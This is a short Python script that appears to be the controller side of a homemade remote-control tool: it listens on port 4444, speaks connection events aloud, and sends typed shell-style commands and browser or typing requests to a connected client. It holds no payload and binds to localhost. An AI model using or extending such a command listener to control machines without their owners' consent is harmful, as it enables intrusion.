import sys
import socket
import speech_recognition as sr
import time
import pyttsx3

engine= pyttsx3.init('sapi5')
voices=engine.getProperty('voices')
engine.setProperty('voice', voices[1].id)
engine.setProperty('rate',130)

def speak(audio):
    engine.say(audio)
    print(audio)
    engine.runAndWait()

SERVER_IP = "127.0.0.1"
PORT = 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_IP, PORT))
s.listen(1)

while True:
    speak(f'[+] listening as ')
    print(f'{SERVER_IP}:{PORT}')
    client = s.accept()
    speak(f'[+]client connected')
    print(f' {client[1]}')
   
    client[0].send('conneted'.encode())
    while True:
        cmd = input('$shell: ')
        client[0].send(cmd.encode())
        if cmd.lower() in ['quit','exit','q','x']:
            break
        if cmd.lower() in ['you','youtube','brose','internet','chrome','text','write','type','pres']:
            serch=input('serch :')
            client[0].send(serch.encode())

       
        
    client[0].close()
    cmd = input('wait for new client y/n') or 'y'
    if cmd.lower() in ['n','no']:
        break

s.close()
